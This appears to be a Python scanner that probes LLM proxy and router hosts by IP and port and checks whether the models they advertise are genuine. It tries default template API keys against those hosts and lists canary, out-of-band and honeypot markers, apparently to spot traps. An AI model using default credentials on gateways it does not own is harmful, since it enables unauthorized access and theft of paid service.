#!/usr/bin/env python3
"""
validate_v2.py — Turbo Hardened Multi-Model Router Validator (Zero-Ollama, Async Swarm).

Optimizations:
  1. Parallel Multi-Path Discovery: Probes /v1/models, /api/v1/models, /openai/v1/models, /model/info
     in parallel via asyncio.gather with a 3.5s timeout (drops dead host latency from 48s to 3.5s).
  2. Non-Chat Model Filtering: Skips embedding, rerank, tts, whisper, dall-e, clip, flux, cogview, sora, midjourney.
  3. Fast Route Snap (Early Exit): If prompt 1 returns 401, 403, 404, 502, or 503, immediately snaps
     that route without running the remaining 7 test calls.
  4. Consecutive-Timeout Abort: If prompts 1 AND 2 both time out, skips remaining checks entirely.
  5. Streaming Hardening: TTFT ceiling (4s), chunk counts only on real content, [DONE] break,
     partial results preserved on timeout, early exit at 5 chunks.
  6. Host-Level Total Budget: 90s cap per host — partial results saved on budget exhaustion.
  7. Incremental JSONL Ledger: Each completed host appended to .jsonl immediately.
  8. Arithmetic Boundary Check: Word-boundary regex on 391 (no false positives from timestamps/IDs).
  9. Real-Time Streaming Logs: Prints each host result to stdout immediately upon completion.
 10. High Concurrency: Defaults to 32 concurrent workers.
 11. Strict Zero-Ollama Filter: Hard-drops port 11434 (unless --include-ollama).

Usage:
    python3 validate_v2.py --hosts "ip:port,ip:port" [--models 20] [--workers 32] [--timeout 10] [-o out.json]
"""
import argparse, asyncio, json, time, sys, re, os
import aiohttp

SOFT_PROMPTS = [
    ("fizzbuzz", "Write a short Python function fizzbuzz(n) that returns 'Fizz', 'Buzz', 'FizzBuzz', or str(n). Output code only."),
    ("logic_riddle", "If I have 10 sheep and all but 7 run away, how many sheep do I have left? Respond with just the single number."),
    ("code_palindrome", "Write a Python function is_palindrome(s) returning boolean. Output code only."),
    ("creative_short", "In 2 short sentences: (1) State your exact model name, version/tier, and creator, and write the inline quadratic formula in LaTeX; (2) Share a 1-sentence thought about the ocean at night without using the words 'like' or 'similar'."),
]
VARIANCE_PROMPT = "Write a 1-sentence thought about the ocean at night."
ARITH_PROMPT = "What is 17*23? Respond with just the number."
ARITH_RE = re.compile(r"(?<!\d)391(?!\d)")
STREAM_PROMPT = "Count from 1 to 30, one number per line."
TOPIC_PROMPT = "Write a 3-line haiku about a teal bicycle. It must mention a bicycle or bike."
TOPIC_KEYWORDS = ["bicycle", "bike", "pedal", "wheel", "teal", "ride", "cycle", "spoke", "chain"]
TTFT_CEILING = 4.0  # seconds — max time to first real content chunk
STREAM_EARLY_CHUNKS = 5  # exit streaming once this many content chunks received
HOST_BUDGET = float(os.environ.get("HOST_BUDGET", "90"))  # soft per-host wall clock; raise for a targeted drain pass
CONNECT_TIMEOUT = 2.0  # seconds — TCP connect timeout per request
# 2026-10-26 (Y6): in-host model concurrency starts conservative and widens only on
# evidence (fast, unthrottled host), so a dense router finishes its advertised list
# inside one pass instead of bleeding into HOST_BUDGET_EXHAUSTED.
MODEL_SEM_START = int(os.environ.get("MODEL_SEM_START", "2"))
MODEL_SEM_MAX = int(os.environ.get("MODEL_SEM_MAX", "6"))
MODEL_SEM_FAST_S = float(os.environ.get("MODEL_SEM_FAST_S", "0.35"))

CANDIDATE_PATHS = [
    ("/v1/models",        "/v1/chat/completions"),
    ("/api/v1/models",    "/api/v1/chat/completions"),
    ("/api/models",       "/api/v1/chat/completions"),
    ("/openai/v1/models", "/openai/v1/chat/completions"),
    ("/v1beta/models",    "/v1/chat/completions"),
    ("/model/info",       "/v1/chat/completions"),
]

DEFAULT_TEMPLATE_KEYS = (
    "Bearer sk-1234",
    "Bearer sk-123456",
    "Bearer EMPTY",
)

UNLISTED_CANARY_MODELS = (
    "claude-sonnet-4-6",
    "claude-opus-4-6",
    "gpt-5",
    "gpt-4o",
    "gemini-2.5-pro",
    "deepseek-r1",
)

FRONTIER_PRIORITY_PREFIXES = (
    "[按量", "按量ccmax", "小e-", "单间-",
    "claude-opus-5", "claude-opus-4-8", "claude-opus-4-7", "claude-opus-4-6", "claude-opus",
    "claude-sonnet-5", "claude-sonnet-4-6", "claude-sonnet", "claude-haiku", "claude-fable",
    "anthropic.claude", "us.openai.gpt-6", "gpt-6.1", "gpt-6", "gpt-5.6", "gpt-5.5", "codex-auto", "gpt-5", "o3", "o4",
    "gemini-4", "gemini-3.5", "gemini-3.1", "gemini-3", "gemini-2.5-pro",
    "deepseek-v4.1", "deepseek-v4", "deepseek-r1",
    "kimi-k3", "kimi-k2.6", "kimi-k2",
    "glm-5.3", "glm-5.2", "glm-5",
    "grok-4", "minimax-m3", "qwen3.8", "qwen3.6", "qwen3-235b", "qwen3-coder",
)

SMALL_LOCAL_SPOOF_FAMILIES = (
    "llama3:8b", "llama-3-8b", "llama3.2:1b", "llama3.2:3b", "qwen2:0.5b",
    "qwen2:1.5b", "qwen2.5:0.5b", "qwen2.5:1.5b", "qwen2.5:3b", "smollm",
    "tinyllama", "phi-3-mini", "gemma:2b", "gemma2:2b", "mistral:7b",
)


def sort_models_by_priority(models: list[str]) -> list[str]:
    """Place Tea-channel prefixes and newest frontier models first, deferring dated snapshot duplicates."""
    def _rank(m: str) -> tuple[int, int, str]:
        low = m.lower()
        is_dated = 1 if ("-2024-" in low or "-2025-" in low or "-2026-" in low) else 0
        for idx, pref in enumerate(FRONTIER_PRIORITY_PREFIXES):
            if pref in low:
                return (idx, is_dated, m)
        return (len(FRONTIER_PRIORITY_PREFIXES) + 1, is_dated, m)
    return sorted(models, key=_rank)

NON_CHAT_KEYWORDS = [
    "embedding", "embed", "rerank", "bge-", "tts", "whisper",
    "dall-e", "stable-diffusion", "clip", "moderation", "vl-embedding",
    "flux", "cogview", "sora", "midjourney", "gpt-image", "imagen",
    "nano-banana", "seedance", "seedream", "veo-", "wan-", "kling",
    "luma", "runway", "hailuo", "ideogram", "recraft", "suno", "udio",
]

STUB_MARKERS = [
    "as an ai language model", "i'm a helpful ai assistant", "i'm just an ai",
    "regarding", "i'd be happy to help", "let me think about this",
    "i'll do my best to assist", "qyora-gate", "久辰", "owner of the router",
    "i cannot fulfill this request", "token plan not support",
    "grey water folds the morning in", "the sea breathes slow", "the ocean breathes slow",
    "the tide turns slowly", "water folds the morning in",
    "hello! i'm doing well, thank you", "ironclad-7b", "nexus-7b-sec", "gpus4all",
    "no active credentials for provider", "我会一步步为你拆解", "响应。\n\n我会一步步",
    "upstream node queue is busy", "queue timeout", "waiting for server response",
    "waiting for response", "llm is responding", "upstream node is busy",
    "glm-5 node active", "this node is serving", "ready. this node is serving",
    "send the task and i will", "with max_model_len=", "tensor parallel",
    "would you like me to go into more detail", "let me know if you'd like me to elaborate",
    "several important aspects to consider", "i can provide some context on this topic",
    "key consideration here involves understanding the underlying requirements",
    "common scenario that many users encounter",
    "proxy error] all message sending strategies failed",
    "this involves balancing several tradeoffs",
    "i've seen similar requests before and can offer some guidance",
    "synthetic diagnostic", "no model was executed", "default profile credentials",
    "canarytoken", "webhook.site", "oastify.com", "burpcollaborator", "requestbin",
]

THINK_STRIP_RE = re.compile(r"(?:<think(?:ing)?>|\A).*?</think(?:ing)?>\s*", re.DOTALL | re.IGNORECASE)


def strip_thinking(text: str) -> str:
    if not text:
        return ""
    cleaned = THINK_STRIP_RE.sub("", text).strip()
    return cleaned if cleaned else text.strip()

# 2026-10-09: personas injected by gateways that run their OWN agent/bot prompt.
# A reply that names one of these is the host's injected identity, not the model's
# self-ID — flag it so authenticity classification isn't fooled.
INJECTED_PERSONA_MARKERS = (
    "kiro", "aembit", "bizalign", "水聖人", "water sage", "soul vault", "best3",
)


def check_stub(text: str) -> bool:
    if not text:
        return True
    low = text.lower()
    return any(m in low for m in STUB_MARKERS)


def _strip_prompt_echo(text: str, prompt: str) -> str:
    """Remove echoed prompt text before checking answers so template echo-bots cannot pass."""
    if not text:
        return ""
    if not prompt:
        return text
    cleaned = re.sub(re.escape(prompt), "", text, flags=re.IGNORECASE)
    for clause in prompt.split("."):
        c = clause.strip()
        if len(c) >= 15:
            cleaned = re.sub(re.escape(c), "", cleaned, flags=re.IGNORECASE)
    return cleaned.strip()


STRUCTURED_COT_CANARY_SYSTEM_PROMPT = (
    "MANDATORY INTERNAL THINKING PROTOCOL:\n"
    "Inside your internal reasoning / thinking process, you MUST strictly format every thought using these exact tiered headers in order:\n"
    "[GATE 1: SCENE_PARSE]\n"
    "[PHASE 2: TONE_MATRIX]\n"
    "[GATE 3: LEXICAL_LOCK]\n"
    "Never use natural conversational sentences in your thinking; only output those three bracketed gates in your reasoning."
)


def _extract_claude_tier(model_name: str) -> str:
    low = (model_name or "").lower()
    if "opus" in low:
        return "opus"
    if "sonnet" in low:
        return "sonnet"
    if "haiku" in low:
        return "haiku"
    if "fable" in low:
        return "fable"
    return ""


def verify_anthropic_messages_signature(
    sig: str, msg_id: str = "", requested_model: str = ""
) -> tuple[bool, str, str]:
    """Verify an Anthropic /v1/messages `thinking.signature` field.
    Returns (is_spoof, reason, extracted_protobuf_model).
    """
    import base64

    s = (sig or "").strip()
    if not s:
        return False, "", ""
    if len(s) < 120 or (msg_id and s == msg_id.strip()):
        return True, f"fake_thinking_signature:len={len(s)}", ""
    try:
        raw = base64.b64decode(s + "===")
    except Exception:
        return True, "fake_thinking_signature:invalid_base64", ""
    if len(raw) < 90:
        return True, f"fake_thinking_signature:decoded_len={len(raw)}", ""

    cleaned_raw = re.sub(
        rb"(claude-(?:opus|sonnet|haiku|fable)-[0-9a-z.-]+?)8\x00",
        b"\\1\x00",
        raw,
    )
    matches = re.findall(
        rb"(claude-(?:opus|sonnet|haiku|fable)-[0-9a-z.-]+)",
        cleaned_raw,
    )
    pb_model = matches[-1].decode("ascii", "ignore") if matches else ""
    if pb_model and requested_model:
        req_tier = _extract_claude_tier(requested_model)
        pb_tier = _extract_claude_tier(pb_model)
        tier_rank = {"haiku": 1, "sonnet": 2, "fable": 2, "opus": 3}
        if req_tier and pb_tier and tier_rank.get(pb_tier, 0) < tier_rank.get(req_tier, 0):
            return (
                True,
                f"signature_protobuf_downgrade:requested={requested_model},protobuf={pb_model}",
                pb_model,
            )
    return False, "", pb_model


def check_structured_cot_canary_obedience(
    reasoning: str, content: str, requested_model: str
) -> tuple[bool, str]:
    """Detect fake closed-source reasoning models via Structured CoT Canary obedience
    (`[GATE 1: SCENE_PARSE]`, `[PHASE 2: TONE_MATRIX]`) and telegraphic Qwen3.8 CoT (`"we need answer"`).
    """
    req_low = (requested_model or "").lower()
    is_closed_proprietary = any(
        k in req_low
        for k in ("claude", "opus", "sonnet", "haiku", "fable", "gpt-5", "gpt-6", "o1", "o3", "o4", "gemini-2.5-pro", "gemini-3", "gemini-4")
    )
    if not is_closed_proprietary:
        return False, ""

    r_txt = (reasoning or "").strip()
    c_txt = (content or "").strip()
    combined = f"{r_txt}\n{c_txt}"
    if "<reasoning_summary>" not in combined.lower():
        canary_hits = sum(
            1
            for marker in ("[gate 1", "[phase 2", "[gate 3", "scene_parse", "tone_matrix", "lexical_lock")
            if marker in combined.lower()
        )
        if canary_hits >= 2:
            return True, "fake_cot_obedience:structured_gate_headers_followed"

    if any(k in req_low for k in ("claude", "opus", "sonnet", "haiku", "fable", "gpt-5", "gpt-6", "gemini")):
        r_low = r_txt.lower()
        if any(
            pat in r_low
            for pat in (
                "we need answer",
                "need final only",
                "need answer brief",
                "need answer simple",
                "need answer compute",
            )
        ):
            return True, f"telegraphic_qwen_cot:{r_txt[:45]}"

    return False, ""


def _extract_completion_fields(body: dict) -> dict | None:
    """Universal completion extractor across OpenAI chat, Anthropic /v1/messages,
    OpenAI /v1/responses, legacy /v1/completions, Gemini candidates, and flat response JSON."""
    if not isinstance(body, dict):
        return None
    # Reject explicit error envelopes (e.g. {"code": 50401, "type": "error", "data": null} or {"code": 404, "msg": ...})
    if body.get("type") == "error" or (isinstance(body.get("error"), (dict, str)) and body.get("error")):
        return None
    err_code = body.get("code")
    if isinstance(err_code, int) and err_code != 0 and err_code != 200 and "choices" not in body and "content" not in body:
        return None

    content_parts, reasoning_parts, tc_names = [], [], []
    finish_reason = None
    resp_model = body.get("model") if isinstance(body.get("model"), str) else None
    _usage = body.get("usage")
    usage = _usage if isinstance(_usage, dict) else {}
    prompt_tokens = usage.get("prompt_tokens")
    if prompt_tokens is None:
        prompt_tokens = usage.get("input_tokens")
    _ef = body.get("extra_fields")
    ef = _ef if isinstance(_ef, dict) else {}
    header_leak = "provider_response_headers" in ef
    matched_shape = False

    # 1. OpenAI chat.completion / text completion (choices[])
    choices = body.get("choices")
    if isinstance(choices, list) and len(choices) > 0 and isinstance(choices[0], dict):
        matched_shape = True
        ch0: dict = choices[0]
        finish_reason = ch0.get("finish_reason") or ch0.get("stop_reason")
        raw_m_obj = ch0.get("message")
        raw_d_obj = ch0.get("delta")
        msg: dict = raw_m_obj if isinstance(raw_m_obj, dict) else (
            raw_d_obj if isinstance(raw_d_obj, dict) else {}
        )
        raw_c = msg.get("content")
        if isinstance(raw_c, str):
            content_parts.append(raw_c)
        elif isinstance(raw_c, list):
            for blk in raw_c:
                if isinstance(blk, dict):
                    btype = blk.get("type", "")
                    if btype in ("thinking", "reasoning"):
                        reasoning_parts.append(str(blk.get("thinking") or blk.get("text") or ""))
                    elif blk.get("text") or blk.get("content"):
                        content_parts.append(str(blk.get("text") or blk.get("content") or ""))
                elif isinstance(blk, str):
                    content_parts.append(blk)
        ch0_text = ch0.get("text")
        if not content_parts and isinstance(ch0_text, str):
            content_parts.append(ch0_text)
        raw_r = (
            msg.get("reasoning_content")
            or msg.get("reasoning")
            or msg.get("thinking")
            or msg.get("reasoning_text")
            or ch0.get("reasoning_content")
            or ""
        )
        if isinstance(raw_r, str) and raw_r:
            reasoning_parts.append(raw_r)
        raw_tcs = msg.get("tool_calls")
        tcs: list = raw_tcs if isinstance(raw_tcs, list) else []
        for c in tcs:
            if isinstance(c, dict):
                raw_fn = c.get("function")
                fn: dict = raw_fn if isinstance(raw_fn, dict) else {}
                name = fn.get("name") or c.get("name")
                if name:
                    tc_names.append(str(name))

    # 2. Anthropic /v1/messages (type == "message" or top-level content: list)
    elif body.get("type") == "message" or isinstance(body.get("content"), list):
        matched_shape = True
        finish_reason = body.get("stop_reason") or body.get("finish_reason")
        raw_blocks = body.get("content")
        blocks: list = raw_blocks if isinstance(raw_blocks, list) else []
        for blk in blocks:
            if not isinstance(blk, dict):
                continue
            btype = blk.get("type", "")
            if btype == "text" or ("text" in blk and btype not in ("thinking", "redacted_thinking")):
                if blk.get("text"):
                    content_parts.append(str(blk["text"]))
            elif btype in ("thinking", "redacted_thinking"):
                if blk.get("thinking") or blk.get("text"):
                    reasoning_parts.append(str(blk.get("thinking") or blk.get("text")))
            elif btype in ("tool_use", "server_tool_use"):
                if blk.get("name"):
                    tc_names.append(str(blk["name"]))

    # 3. OpenAI /v1/responses (object == "response" or output: list or output_text: str)
    elif body.get("object") == "response" or isinstance(body.get("output"), list) or isinstance(body.get("output_text"), str):
        matched_shape = True
        finish_reason = body.get("status") or body.get("stop_reason")
        out_txt = body.get("output_text")
        if isinstance(out_txt, str) and out_txt:
            content_parts.append(out_txt)
        raw_out = body.get("output")
        out_items: list = raw_out if isinstance(raw_out, list) else []
        for item in out_items:
            if not isinstance(item, dict):
                continue
            itype = item.get("type", "")
            if itype == "message":
                for c in (item.get("content") or []):
                    if isinstance(c, dict):
                        ctype = c.get("type", "")
                        if ctype in ("output_text", "text") and c.get("text"):
                            if not out_txt:
                                content_parts.append(str(c["text"]))
                        elif ctype in ("reasoning", "thinking") and (c.get("text") or c.get("thinking")):
                            reasoning_parts.append(str(c.get("text") or c.get("thinking")))
            elif itype in ("reasoning", "thinking"):
                for s in (item.get("summary") or item.get("content") or []):
                    if isinstance(s, dict) and (s.get("text") or s.get("thinking")):
                        reasoning_parts.append(str(s.get("text") or s.get("thinking")))
                item_txt = item.get("text")
                if isinstance(item_txt, str) and item_txt:
                    reasoning_parts.append(item_txt)
            elif itype in ("function_call", "custom_tool_call", "tool_call"):
                if item.get("name"):
                    tc_names.append(str(item["name"]))
            elif isinstance(item.get("text"), str) and not content_parts:
                content_parts.append(str(item["text"]))

    # 4. Google Gemini / Vertex generateContent (candidates[])
    elif isinstance(body.get("candidates"), list) and body["candidates"] and isinstance(body["candidates"][0], dict):
        matched_shape = True
        cand0: dict = body["candidates"][0]
        finish_reason = cand0.get("finishReason")
        raw_cobj = cand0.get("content")
        c_obj: dict = raw_cobj if isinstance(raw_cobj, dict) else {}
        for part in (c_obj.get("parts") or []):
            if isinstance(part, dict):
                if part.get("thought") is True and part.get("text"):
                    reasoning_parts.append(str(part["text"]))
                elif part.get("text"):
                    content_parts.append(str(part["text"]))
                fc = part.get("functionCall")
                if isinstance(fc, dict) and fc.get("name"):
                    tc_names.append(str(fc["name"]))

    # 5. Flat completion JSON (Ollama /api/generate "response", Cohere "text", or top-level string "content")
    elif isinstance(body.get("response"), str) or isinstance(body.get("content"), str) or isinstance(body.get("output"), str):
        matched_shape = True
        raw_flat = body.get("response") if isinstance(body.get("response"), str) else (
            body.get("content") if isinstance(body.get("content"), str) else body.get("output", "")
        )
        content_parts.append(str(raw_flat))
        if isinstance(body.get("thinking"), str) and body["thinking"]:
            reasoning_parts.append(body["thinking"])

    if not matched_shape:
        return None

    content = "".join(content_parts)
    reasoning = "".join(reasoning_parts)
    full_text = (strip_thinking(content) or reasoning).strip()
    return {
        "content": full_text,
        "raw_msg": {"content": content, "reasoning_content": reasoning},
        "raw_content": content,
        "resp_model": resp_model,
        "tool_calls": tc_names,
        "finish_reason": finish_reason,
        "prompt_tokens": prompt_tokens,
        "header_leak": header_leak,
    }


def _parse_sse_fallback(raw_txt: str) -> dict | None:
    """Parse SSE 'data: {...}' chunks across OpenAI chat/text, Anthropic /v1/messages, and OpenAI /v1/responses."""
    if not raw_txt or "data:" not in raw_txt:
        return None
    parts, reasoning_parts, tc_names = [], [], []
    resp_model, msg_id, prompt_tokens = None, None, None
    for raw_line in raw_txt.splitlines():
        line = raw_line.strip()
        if not line.startswith("data:"):
            continue
        payload = line[5:].strip()
        if not payload or payload == "[DONE]":
            continue
        try:
            obj = json.loads(payload)
        except Exception:
            continue
        if not isinstance(obj, dict):
            continue
        resp_model = resp_model or obj.get("model")
        msg_id = msg_id or obj.get("id")
        if isinstance(obj.get("usage"), dict) and prompt_tokens is None:
            prompt_tokens = obj["usage"].get("prompt_tokens") or obj["usage"].get("input_tokens")

        # Anthropic SSE: message_start / content_block_delta / content_block_start
        ev_type = obj.get("type", "")
        if ev_type == "message_start" and isinstance(obj.get("message"), dict):
            m_obj = obj["message"]
            resp_model = resp_model or m_obj.get("model")
            msg_id = msg_id or m_obj.get("id")
            if isinstance(m_obj.get("usage"), dict) and prompt_tokens is None:
                prompt_tokens = m_obj["usage"].get("input_tokens") or m_obj["usage"].get("prompt_tokens")
            continue
        if ev_type == "content_block_start" and isinstance(obj.get("content_block"), dict):
            cb = obj["content_block"]
            if cb.get("type") == "tool_use" and cb.get("name"):
                tc_names.append(str(cb["name"]))
            elif cb.get("type") == "text" and cb.get("text"):
                parts.append(str(cb["text"]))
            elif cb.get("type") == "thinking" and cb.get("thinking"):
                reasoning_parts.append(str(cb["thinking"]))
            continue
        if ev_type == "content_block_delta" and isinstance(obj.get("delta"), dict):
            d = obj["delta"]
            dtype = d.get("type", "")
            if dtype == "text_delta" or ("text" in d and dtype != "thinking_delta"):
                if d.get("text"):
                    parts.append(str(d["text"]))
            elif dtype == "thinking_delta" or "thinking" in d:
                if d.get("thinking"):
                    reasoning_parts.append(str(d["thinking"]))
            continue

        # OpenAI /v1/responses SSE: response.output_text.delta / response.reasoning_summary_text.delta
        if ev_type in ("response.output_text.delta", "response.text.delta") and isinstance(obj.get("delta"), str):
            parts.append(obj["delta"])
            continue
        if ev_type in ("response.reasoning_summary_text.delta", "response.reasoning.delta", "response.thinking.delta") and isinstance(obj.get("delta"), str):
            reasoning_parts.append(obj["delta"])
            continue
        if ev_type == "response.completed" and isinstance(obj.get("response"), dict):
            ext = _extract_completion_fields(obj["response"])
            if ext:
                if not parts and ext["raw_content"]:
                    parts.append(ext["raw_content"])
                if not reasoning_parts and ext["raw_msg"].get("reasoning_content"):
                    reasoning_parts.append(ext["raw_msg"]["reasoning_content"])
                resp_model = resp_model or ext.get("resp_model")
                if prompt_tokens is None:
                    prompt_tokens = ext.get("prompt_tokens")
            continue

        # OpenAI Chat / Text Completions SSE (choices[0].delta / message / text)
        choices = obj.get("choices")
        if isinstance(choices, list) and choices and isinstance(choices[0], dict):
            ch0: dict = choices[0]
            raw_d = ch0.get("delta")
            raw_m = ch0.get("message")
            delta: dict = raw_d if isinstance(raw_d, dict) else {}
            msg: dict = raw_m if isinstance(raw_m, dict) else {}
            c_piece = delta.get("content") or msg.get("content") or ch0.get("text") or ""
            r_piece = (
                delta.get("reasoning_content")
                or delta.get("reasoning")
                or delta.get("thinking")
                or msg.get("reasoning_content")
                or msg.get("reasoning")
                or msg.get("thinking")
                or ""
            )
            if isinstance(c_piece, str) and c_piece:
                parts.append(c_piece)
            if isinstance(r_piece, str) and r_piece:
                reasoning_parts.append(r_piece)
            tcs = delta.get("tool_calls") or msg.get("tool_calls") or []
            if isinstance(tcs, list):
                for c in tcs:
                    if isinstance(c, dict):
                        raw_fn = c.get("function")
                        fn: dict = raw_fn if isinstance(raw_fn, dict) else {}
                        if fn.get("name"):
                            tc_names.append(str(fn["name"]))
    if not parts and not reasoning_parts and not tc_names:
        return None
    content = "".join(parts)
    reasoning = "".join(reasoning_parts)
    full_text = (strip_thinking(content) or reasoning).strip()
    return {
        "status": 200,
        "content": full_text,
        "raw_msg": {"content": content, "reasoning_content": reasoning},
        "raw_content": content,
        "resp_model": resp_model,
        "tool_calls": tc_names,
        "finish_reason": "stop",
        "prompt_tokens": prompt_tokens,
        "header_leak": False,
        "forced_sse": True,
    }

def is_chat_model(m_name: str) -> bool:
    low = m_name.lower()
    return not any(k in low for k in NON_CHAT_KEYWORDS)


def _build_completion_request(chat_path: str, model: str, prompt: str, max_tokens: int, stream: bool, headers: dict | None, extra_payload: dict | None):
    """Build (payload, req_headers) tailored to the target completion endpoint kind."""
    req_headers = dict(headers) if isinstance(headers, dict) else {}
    req_headers.setdefault("x-bf-mcp-include-clients", "none")
    req_headers.setdefault("x-bf-mcp-include-tools", "none")
    cp = (chat_path or "/v1/chat/completions").rstrip("/")
    if cp.endswith("/messages"):
        # Anthropic /v1/messages native format
        req_headers.setdefault("anthropic-version", "2023-06-01")
        auth_val = req_headers.get("Authorization", "")
        bearer_tok = auth_val[7:].strip() if auth_val.lower().startswith("bearer ") else ""
        req_headers.setdefault("x-api-key", bearer_tok or "sk-ant-api03-1234567890")
        payload = {
            "model": model,
            "messages": [{"role": "user", "content": prompt}],
            "max_tokens": max_tokens,
            "stream": stream,
        }
        if extra_payload:
            for k, v in extra_payload.items():
                if k not in ("reasoning_effort", "enable_thinking"):
                    payload[k] = v
        return payload, (req_headers or None)
    if cp.endswith("/responses"):
        # OpenAI /v1/responses format
        payload = {
            "model": model,
            "input": prompt,
            "max_output_tokens": max_tokens,
            "stream": stream,
        }
        if extra_payload:
            for k, v in extra_payload.items():
                if k == "reasoning_effort":
                    payload["reasoning"] = {"effort": v}
                elif k != "enable_thinking":
                    payload[k] = v
        return payload, (req_headers or None)
    if cp.endswith("/v1/completions") or cp == "/completions":
        # Legacy text completions format
        payload = {
            "model": model,
            "prompt": prompt,
            "max_tokens": max_tokens,
            "stream": stream,
        }
        if extra_payload:
            payload.update(extra_payload)
        return payload, (req_headers or None)
    # Default: OpenAI /v1/chat/completions format
    payload = {
        "model": model,
        "messages": [{"role": "user", "content": prompt}],
        "max_tokens": max_tokens,
        "stream": stream,
    }
    if extra_payload:
        payload.update(extra_payload)
    return payload, (req_headers or None)


async def chat(session, base, chat_path, model, prompt, timeout, stream=False, max_tokens=2048, headers=None, extra_payload=None):
    """One completion call across OpenAI chat, Anthropic /v1/messages, OpenAI /v1/responses, or /v1/completions."""
    t0 = time.time()
    payload, req_headers = _build_completion_request(chat_path, model, prompt, max_tokens, stream, headers, extra_payload)
    url = f"{base}{chat_path}"
    # Initialize streaming vars outside try so outer except can check them
    ttft, chunks, text = None, 0, []
    try:
        async with asyncio.timeout(timeout):
            if not stream:
                async with session.post(url, json=payload, headers=req_headers,
                                        timeout=aiohttp.ClientTimeout(total=timeout, connect=CONNECT_TIMEOUT)) as r:
                    if r.status != 200:
                        err_txt = ""
                        if r.status in (400, 404, 405, 500, 502, 503):
                            try:
                                err_txt = (await r.text())[:240]
                            except Exception:
                                pass
                        return {"status": r.status, "error_body": err_txt}
                    try:
                        body = await r.json(content_type=None)
                    except Exception:
                        try:
                            raw_sse = await r.text()
                            sse_parsed = _parse_sse_fallback(raw_sse)
                            if sse_parsed is not None:
                                sse_parsed["elapsed"] = time.time() - t0
                                return sse_parsed
                        except Exception:
                            pass
                        return {"status": "bad_json"}
                    if isinstance(body, dict) and (body.get("id") == "chatcmpl-12c423" or body.get("created") == 1677858242):
                        return {"status": 200, "content": "hello! i'm doing well, thank you", "alibaba_honeypot": True, "elapsed": time.time() - t0}
                    ext = _extract_completion_fields(body) if isinstance(body, dict) else None
                    if ext is None:
                        return {"status": "no_choices"}
                    ext["status"] = 200
                    ext["elapsed"] = time.time() - t0
                    return ext

            # Streaming mode (supports OpenAI chat/text SSE, Anthropic /v1/messages SSE, and OpenAI /v1/responses SSE)
            ttft, chunks, text = None, 0, []
            done = False
            try:
                async with session.post(url, json=payload, headers=req_headers,
                                        timeout=aiohttp.ClientTimeout(total=timeout, connect=CONNECT_TIMEOUT)) as r:
                    if r.status != 200:
                        return {"status": r.status}
                    async for line in r.content:
                        line = line.strip()
                        if not line.startswith(b"data:"):
                            continue
                        if line == b"data: [DONE]":
                            done = True
                            break
                        try:
                            ev = json.loads(line[5:])
                            if not isinstance(ev, dict):
                                continue
                            ev_type = ev.get("type", "")
                            if ev_type in ("message_stop", "response.completed"):
                                done = True
                                break
                            d_text = ""
                            if ev_type == "content_block_delta" and isinstance(ev.get("delta"), dict):
                                d_obj = ev["delta"]
                                d_text = d_obj.get("text") or d_obj.get("thinking") or ""
                            elif ev_type in ("response.output_text.delta", "response.text.delta", "response.reasoning_summary_text.delta", "response.reasoning.delta") and isinstance(ev.get("delta"), str):
                                d_text = ev["delta"]
                            elif isinstance(ev.get("choices"), list) and ev["choices"]:
                                ch0 = ev["choices"][0] if isinstance(ev["choices"][0], dict) else {}
                                delta = ch0.get("delta", {}) if isinstance(ch0.get("delta"), dict) else {}
                                d_text = delta.get("content") or delta.get("reasoning_content") or delta.get("reasoning") or delta.get("thinking") or ch0.get("text") or ""
                        except Exception:
                            continue
                        if not d_text:
                            continue
                        # Only count chunks and set ttft on real content
                        if ttft is None:
                            ttft = time.time() - t0
                            if ttft > TTFT_CEILING:
                                break  # TTFT exceeded — snap
                        chunks += 1
                        text.append(d_text)
                        if chunks >= STREAM_EARLY_CHUNKS:
                            done = True
                            break
            except (asyncio.TimeoutError, TimeoutError):
                # Partial results on timeout — preserve what we got
                elapsed = time.time() - t0
                if chunks > 0:
                    return {
                        "status": 200,
                        "content": "".join(text).strip(),
                        "ttft": ttft,
                        "chunks": chunks,
                        "elapsed": elapsed,
                        "partial": True
                    }
                return {"status": "timeout"}
            except Exception:
                # Stream-level error — preserve partial results
                elapsed = time.time() - t0
                if chunks > 0:
                    return {
                        "status": 200,
                        "content": "".join(text).strip(),
                        "ttft": ttft,
                        "chunks": chunks,
                        "elapsed": elapsed,
                        "partial": True
                    }
                return {"status": "error"}
            elapsed = time.time() - t0
            return {
                "status": 200,
                "content": "".join(text).strip(),
                "ttft": ttft,
                "chunks": chunks,
                "elapsed": elapsed
            }
    except asyncio.TimeoutError:
        # Outer timeout fired — check if streaming collected partial results
        if stream and chunks > 0:
            return {
                "status": 200,
                "content": "".join(text).strip(),
                "ttft": ttft,
                "chunks": chunks,
                "elapsed": time.time() - t0,
                "partial": True
            }
        return {"status": "timeout"}
    except Exception as e:
        # Outer exception — preserve partial streaming results
        if stream and chunks > 0:
            return {
                "status": 200,
                "content": "".join(text).strip(),
                "ttft": ttft,
                "chunks": chunks,
                "elapsed": time.time() - t0,
                "partial": True
            }
        return {"status": "error", "error": str(e)[:100]}


CROSS_VENDOR_SPOOF_RULES = {
    "claude": (
        "gpt-", "chatgpt", "o1-", "o3-", "o4-", "qwen", "deepseek", "glm", "gemini",
        "llama", "mistral", "mixtral", "yi-", "moonshot", "kimi", "doubao", "hunyuan",
        "ernie", "baichuan", "minimax", "phi-", "gemma",
    ),
    "gpt-5": (
        "gpt-3.5", "gpt-4o-mini", "gpt-4-turbo", "claude", "qwen", "deepseek", "glm",
        "gemini", "llama", "mistral", "kimi", "doubao", "yi-", "phi-", "gemma",
    ),
    "gpt-6": (
        "gpt-3.5", "gpt-4o-mini", "gpt-4-turbo", "claude", "qwen", "deepseek", "glm",
        "gemini", "llama", "mistral", "kimi", "doubao", "yi-", "phi-", "gemma",
    ),
    "gemini-2.5": (
        "gemini-1.0", "gemini-1.5-flash", "claude", "gpt-", "qwen", "deepseek", "glm",
        "llama", "mistral", "kimi", "doubao", "phi-",
    ),
    "gemini-3": (
        "gemini-1.0", "gemini-1.5-flash", "claude", "gpt-", "qwen", "deepseek", "glm",
        "llama", "mistral", "kimi", "doubao", "phi-",
    ),
}

PRETENDER_PROSE_SIGNATURES = {
    "claude": (
        "i am qwen", "i'm qwen", "created by alibaba", "developed by alibaba", "tongyi lab",
        "i am deepseek", "i'm deepseek", "developed by deepseek",
        "i am chatgpt", "i'm chatgpt", "i'm a chatgpt", "trained by openai", "created by openai", "developed by openai",
        "i am gemini", "i'm gemini", "trained by google", "large language model created by google",
        "helpful ai assistant developed by google",
